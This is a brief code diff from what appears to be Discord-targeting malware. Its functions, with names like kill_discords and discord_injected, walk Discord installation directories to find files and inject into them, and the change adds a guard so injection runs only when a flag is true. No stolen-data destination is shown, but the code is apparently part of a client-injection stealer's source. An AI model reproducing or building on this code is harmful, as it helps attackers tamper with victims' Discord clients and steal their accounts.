@@ -191,6 +191,7 @@ export const kill_discords = async (res) => {
 };
 
 export const discord_injected = async (res) => {
+  if (res !== true) return;
   try {
     for (let dir of discords_dirs()) find_indexs(dir);
     for (let dir of discords_dirs()) await find_injects(dir);
